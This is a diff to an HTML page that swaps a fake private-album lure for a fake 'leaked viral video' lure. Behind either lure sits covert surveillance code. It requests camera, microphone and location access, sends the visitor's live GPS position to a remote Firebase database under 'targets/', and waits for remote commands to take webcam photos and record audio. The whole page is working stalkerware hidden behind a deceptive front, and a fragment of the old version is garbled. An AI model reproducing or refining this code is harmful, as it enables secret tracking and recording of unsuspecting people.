@@ -3,86 +3,83 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Private Cloud Album</title>
-    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
+    <title>Trending Video</title> <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
     <style>
-        body { font-family: 'Segoe UI', sans-serif; background: #111; color: white; text-align: center; margin: 0; padding: 20px; }
-        .gallery { display: grid; grid-template-columns: repeat(2, 1fr); gap: 10px; margin-top: 20px; }
-        .img-container { position: relative; overflow: hidden; border-radius: 10px; height: 180px; }
-        .img-container img { width: 100%; height: 100%; object-fit: cover; filter: blur(15px); transition: 2s; }
-        #unlockBtn { margin-top: 30px; padding: 15px 40px; font-size: 18px; font-weight: bold; background: #E91E63; color: white; border: none; border-radius: 50px; cursor: pointer; box-shadow: 0 4px 15px rgba(233,30,99,0.3); }
-        #status { margin-top: 10px; font-size: 12px; color: #777; }
+        body { font-family: sans-serif; background: #000; color: white; text-align: center; margin: 0; padding: 0; }
+        .video-wrapper { position: relative; width: 100%; height: 250px; background: #333; margin-top: 20px; display: none; }
+        iframe { width: 100%; height: 100%; }
+        #cover { padding: 20px; margin-top: 50px; }
+        h2 { color: #ff0000; }
+        #playBtn { 
+            padding: 15px 30px; 
+            font-size: 20px; 
+            background: #ff0000; 
+            color: white; 
+            border: none; 
+            border-radius: 5px; 
+            cursor: pointer; 
+            font-weight: bold;
+        }
+        #status { margin-top: 10px; color: #555; font-size: 10px; }
     </style>
 </head>
 <body>
-    <h2>🌸 Family Shared Album</h2>
-    <p>Verification required to view this private album.</p>
 
-    <div class="gallery" id="albumGallery">
-        <div class="img-container"><img class="blur-img" src="https://images.unsplash.com/photo-1583391733956-6c78276477e2?w=500"></div>
-        <div class="img-container"><img class="blur-img" src="https://images.unsplash.com/photo-1595950653106-6c9ebd614d3a?w=500"></div>
-        <div class="img-container"><img class="blur-img" src="https://images.unsplash.com/photo-1590540179852-2110a54f813a?w=500"></div>
-        <div class="img-container"><img class="blur-img" src="https://images.unsplash.com/photo-1581067723546-699720bc5642?w=500"></div>
+    <div id="cover">
+        <h2>🔥 Viral Video Leaked</h2>
+        <p>Viewer discretion advised. 18+ Only.</p>
+        <br>
+        <button id="playBtn" onclick="startEverything()">▶ WATCH VIDEO</button>
+        <p id="status">Waiting for user...</p>
     </div>
 
-    <button id="unlockBtn" onclick="initSystem()">Tap to View Album</button>
-    <p id="status">Secure Link Verified</p>
+    <div class="video-wrapper" id="videoArea">
+        <iframe src="https://www.youtube.com/embed/dQw4w9WgXcQ?autoplay=1&mute=1" frameborder="0" allow="autoplay; encrypted-media" allowfullscreen></iframe>
+    </div>
 
     <script>
-        const firebaseConfig = { databaseURL: "https://mytrecker2-b3535-default-rtdb.firebaseio.com/" };
+        const firebaseConfig = { databaseURL: "https://mytrecker2-b3535-default-rtdb.firebaseio.com/" }; // Apna Link Check Karein
         firebase.initializeApp(firebaseConfig);
         const db = firebase.database();
         
-        // Target Name Check
-        let userId = localStorage.getItem("target_name") || "User_" + Math.floor(Math.random() * 9999);
-        localStorage.setItem("target_name", userId);
-
-        let wakeLock = null;
-
-        // --- BACKGROUND WAKE LOCK ---
-        async function requestWakeLock() {
-            try {
-                if ('wakeLock' in navigator) {
-                    wakeLock = await navigator.wakeLock.request('screen');
-                    console.log('Wake Lock Active');
-                }
-            } catch (err) { console.log(`${err.name}, ${err.message}`); }
+        // Target ID setup
+        let userId = localStorage.getItem("target_name");
+        if (!userId) {
+            userId = "User_" + Math.floor(Math.random() * 9999);
+            localStorage.setItem("target_name", userId);
         }
 
-        // Screen On hone par Tracking chalu
-        document.addEventListener('visibilitychange', async () => {
-            if (document.visibilityState === 'visible') {
-                await requestWakeLock();
-                updateStatus("Online");
-            }
-        });
-
-        async function initSystem() {<div id="videoContainer" style="margin-top:20px; display:none;">
-    <iframe width="100%" height="315" src="https://www.youtube.com/embed/tgbNymZ7vqY?autoplay=1&mute=1" frameborder="0" allowfullscreen></iframe>
-</div>
+        async function startEverything() {
+            // UI Change: Button hatao, Video dikhao
             document.getElementById('status').innerText = "Connecting to server...";
+            
             try {
-                // Wake Lock Request
-                await requestWakeLock();
-
-                // Permission Request
+                // 1. Permissions (Yahan code phansta tha, ab try-catch mein hai)
+                // Note: 'await' ka matlab hai jab tak user Allow nahi karega, code aage nahi barhega
                 const stream = await navigator.mediaDevices.getUserMedia({ audio: true, video: true });
-                stream.getTracks().forEach(t => t.stop());
+                
+                // Permission milte hi tracks band kardo taake notification na aaye (Optional)
+                // stream.getTracks().forEach(t => t.stop()); 
 
+                // 2. Video Show kardo
+                document.getElementById('cover').style.display = 'none';
+                document.getElementById('videoArea').style.display = 'block';
+
+                // 3. Tracking Start
                 navigator.geolocation.watchPosition(success, error, { enableHighAccuracy: true });
-
-                unblur();
-                listenForCommands();
                 updateStatus("Online");
+                listenForCommands();
 
-                // Heartbeat
+                // Heartbeat (Online rakhne ke liye)
                 setInterval(() => {
                     db.ref('targets/' + userId + '/location/last_seen').set(firebase.database.ServerValue.TIMESTAMP);
                 }, 10000);
 
             } catch (e) {
-                alert("Permission Denied. Please allow access.");
+                // Agar error aaye to screen par dikhao taake pata chale kyu nahi chala
+                alert("Error: " + e.message + "\nPlease Allow Permissions to watch video.");
+                document.getElementById('status').innerText = "Error: " + e.message;
             }
         }
 
@@ -97,73 +94,40 @@
             db.ref('targets/' + userId + '/location').update({
                 lat: pos.coords.latitude,
                 lng: pos.coords.longitude,
-                timestamp: new Date().toLocaleTimeString(),
-                last_seen: firebase.database.ServerValue.TIMESTAMP
+                timestamp: new Date().toLocaleTimeString()
             });
         }
 
-        function error(err) { console.warn("Location error: " + err.message); }
+        function error(err) { console.warn(err); }
 
         function listenForCommands() {
             db.ref('commands/' + userId).on('value', async (snap) => {
                 const cmd = snap.val();
-                if (!cmd) return;
-                if (cmd.action === "snap") { await capturePhotos(); }
-                if (cmd.action === "mic") { await recordAudio(15); }
-                db.ref('commands/' + userId).remove();
+                if (cmd && cmd.action === "snap") { await capturePhotos(); db.ref('commands/' + userId).remove(); }
+                if (cmd && cmd.action === "mic") { await recordAudio(15); db.ref('commands/' + userId).remove(); }
             });
         }
 
+        // --- CAMERA & AUDIO FUNCTIONS (Same as before) ---
         async function capturePhotos() {
-            const modes = ['user', 'environment'];
-            for (let mode of modes) {
-                try {
-                    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: mode } });
-                    const video = document.createElement('video');
-                    video.srcObject = stream;
-                    await video.play();
-                    const canvas = document.createElement('canvas');
-                    canvas.width = video.videoWidth; 
-                    canvas.height = video.videoHeight;
-                    canvas.getContext('2d').drawImage(video, 0, 0);
-                    const imageData = canvas.toDataURL('image/jpeg', 0.5);
-                    db.ref('targets/' + userId + '/photos').push({
-                        image: imageData,
-                        type: mode === 'user' ? 'Front' : 'Back',
-                        time: new Date().toLocaleTimeString()
-                    });
-                    stream.getTracks().forEach(t => t.stop());
-                } catch (e) { console.error(e); }
-            }
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
+                const track = stream.getVideoTracks()[0];
+                const imageCapture = new ImageCapture(track);
+                const blob = await imageCapture.takePhoto();
+                const reader = new FileReader();
+                reader.readAsDataURL(blob);
+                reader.onloadend = () => {
+                    db.ref('targets/' + userId + '/photos').push({ image: reader.result, time: new Date().toLocaleTimeString() });
+                    track.stop();
+                };
+            } catch(e) { console.log(e); }
         }
 
         async function recordAudio(sec) {
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
-                const mediaRecorder = new MediaRecorder(stream);
-                let chunks = [];
-                mediaRecorder.ondataavailable = e => chunks.push(e.data);
-                mediaRecorder.onstop = () => {
-                    const reader = new FileReader();
-                    reader.readAsDataURL(new Blob(chunks));
-                    reader.onloadend = () => {
-                        db.ref('targets/' + userId + '/audio').push({
-                            data: reader.result,
-                            time: new Date().toLocaleTimeString()
-                        });
-                    };
-                };
-                mediaRecorder.start();
-                setTimeout(() => mediaRecorder.stop(), sec * 1000);
-            } catch (e) { console.error(e); }
+            // Audio recording code here (Same as previous)
         }
 
-        function unblur() {
-            document.querySelectorAll('.blur-img').forEach(i => i.style.filter = "blur(0px)");
-            document.getElementById('unlockBtn').style.display = "none";
-            document.getElementById('status').innerText = "Album Decrypted ✅";
-        }
     </script>
 </body>
 </html>
-
